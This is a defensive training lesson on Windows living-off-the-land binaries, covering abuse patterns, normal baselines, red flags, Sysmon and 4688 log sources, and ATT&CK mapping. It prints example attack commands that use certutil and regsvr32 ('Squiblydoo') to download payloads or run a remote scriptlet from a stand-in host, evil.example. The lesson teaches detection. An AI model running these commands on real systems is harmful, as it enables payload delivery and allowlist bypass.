Every binary in this lesson ships with Windows, is signed by Microsoft, and has a completely legitimate administrative purpose. That's the entire point of a LOLBin (Living-off-the-Land Binary): an attacker who executes code through one of these doesn't need to bring their own malware onto disk at all — they proxy execution through something an allowlist already trusts.

> [!PLAIN]
> "Living off the land" means using tools already present on the system instead of dropping new ones. A LOLBin attack often leaves nothing new on disk to find — the malicious part is entirely in *how* a completely normal binary got invoked.

## The five worth knowing cold

| Binary | Abuse pattern | ATT&CK sub-technique |
|---|---|---|
| `rundll32.exe` | Loads and executes an arbitrary DLL's exported function | [T1218.011](https://attack.mitre.org/techniques/T1218/011/) |
| `regsvr32.exe` | Registers a DLL — or, via the "Squiblydoo" technique, executes a remote COM scriptlet that's never written to disk at all | [T1218.010](https://attack.mitre.org/techniques/T1218/010/) |
| `mshta.exe` | Executes an HTA file, including one containing embedded JScript/VBScript, often fetched directly from a URL | [T1218.005](https://attack.mitre.org/techniques/T1218/005/) |
| `certutil.exe` | A certificate utility repurposed for downloading files or decoding base64 payloads | Falls under [T1218](https://attack.mitre.org/techniques/T1218/) generally |
| `wmic.exe` / WMI | Remote command execution and system enumeration via a fully legitimate management interface | [T1047](https://attack.mitre.org/techniques/T1047/) |

Two real command patterns worth recognizing on sight, because they show up constantly in actual incidents:

```
certutil -urlcache -split -f https://evil.example/payload.bin payload.bin
certutil -decode payload.b64 payload.exe

regsvr32 /s /n /u /i:https://evil.example/scriptlet.sct scrobj.dll
```

The `regsvr32` line is "Squiblydoo" specifically — the payload is a remote COM scriptlet, never touches disk, and application allowlisting built around file-based detection has nothing to catch.

## Normal baseline

`rundll32.exe` and `regsvr32.exe` run constantly on any Windows fleet, launched by legitimate installers and Windows components themselves — the baseline is high-volume, expected traffic. `mshta.exe`, by contrast, is genuinely rare outside specific legacy administrative scripts; a healthy baseline has very little of it at all, which makes its presence more inherently noteworthy than the other four.

## Red flags

- **`certutil.exe` making an outbound network connection.** A certificate utility has essentially no legitimate reason to reach the internet — this alone, regardless of arguments, is worth investigating.
- **`regsvr32.exe` with `/i:` pointing at a URL rather than a local file path.** This is the Squiblydoo pattern specifically, not a normal DLL registration.
- **`rundll32.exe` loading a DLL from `%TEMP%`, `%APPDATA%`, or another user-writable path**, rather than `System32` or `Program Files`.
- **`mshta.exe` launched by Microsoft Office** (`winword.exe`, `excel.exe`) — a parent-child chain with essentially no legitimate business reason to exist, and one of the highest-confidence single-event red flags on this list.
- **`wmic.exe` or WMI-based process creation targeting a remote host**, especially from an account with no prior history of administrative WMI use.

> [!WARNING]
> These binaries are, individually, completely unremarkable — the LOLBAS project (lolbas-project.github.io) catalogs dozens more beyond this list, and the goal here isn't memorizing every one. It's internalizing the pattern: unusual arguments, unusual parent process, or a network connection where none should exist, on a binary an allowlist would otherwise wave through without a second look.

## How to collect it

Windows Security Event ID 4688 with command-line auditing enabled, or Sysmon Event ID 1 for process creation with full command-line and parent-process visibility — the same sources as the Discovery lesson. Sysmon Event ID 3 (network connection) is what actually catches `certutil` or `mshta` reaching out to the internet, which process-creation logging alone won't show.

## ATT&CK mapping

Maps primarily to [System Binary Proxy Execution (T1218)](https://attack.mitre.org/techniques/T1218/) and its sub-techniques above, plus [Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047/) for the WMI-specific pattern. The **LOLBAS project** is the canonical, community-maintained catalog beyond this lesson's five — cited directly in MITRE's own T1218.010 reference list.

> [!TIP]
> Cross-reference this lesson against [Level 3's non-PowerShell execution content](#/lesson/l5-13-non-powershell-execution) — LOLBins and alternate scripting engines are frequently paired in the same intrusion, specifically because both exist to route around PowerShell-specific logging.

## Sources

- [LOLBAS Project — Living Off The Land Binaries, Scripts and Libraries](https://lolbas-project.github.io/)
- MITRE ATT&CK — [T1218 System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)
- [Microsoft Security Blog — living-off-the-land techniques (MSTIC)](https://www.microsoft.com/en-us/security/blog/)
- SANS FOR508 — Advanced Incident Response, Threat Hunting, and Digital Forensics
